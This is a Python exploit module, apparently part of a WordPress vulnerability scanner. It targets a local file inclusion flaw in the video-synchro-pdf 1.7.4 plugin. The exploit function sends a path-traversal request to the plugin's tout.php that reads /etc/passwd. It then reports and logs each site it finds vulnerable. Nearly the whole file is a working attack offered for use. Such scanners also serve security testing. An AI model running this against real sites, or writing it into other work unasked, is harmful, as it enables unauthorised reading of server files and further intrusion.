import sys
import os
try:
    # The insertion index should be 1 because index 0 is this file
    sys.path.insert(1, '{}/help'.format(os.getcwd()))  # the type of path is string
    # because the system path already have the absolute path to folder a
    # so it can recognize file_a.py while searching 
    from help.banner import colors
    from help.json_me import json_me
    from help.req import request
    
except (ModuleNotFoundError, ImportError) as e:
    print("{} fileure".format(type(e)))
else:
    print("Import succeeded")


def exploit(url):
    found = []
    req = request(url)
    if not (url.startswith('https://') or url.startswith('http://')):
        url = 'http://' + url
    try:
        x =  "{}/wp-content/plugins/video-synchro-pdf/reglages/Menu_Plugins/tout.php?p=../../../../../../../../../../../../etc/passwd"
        r = req.get(x.format(url))
        if r.status_code == 200 and "root" in r.text:
            print(colors.yellow + "[+] ==> video-synchro-pdf %s Vulnerable" % url)
            found.append({
                "url": url,
                "payload": x.format(url),
                "status": r.status_code,
                "exploit": "WordPress Plugin video-synchro-pdf 1.7.4 - Local File Inclusion"
            })
            json_me(url, "video-synchro-pdf", found)
        else:

            print(colors.red + "[-] video-synchro-pdf ==> %s Not Vulnerable" % url )


    except Exception as e:
        print(e)
        pass


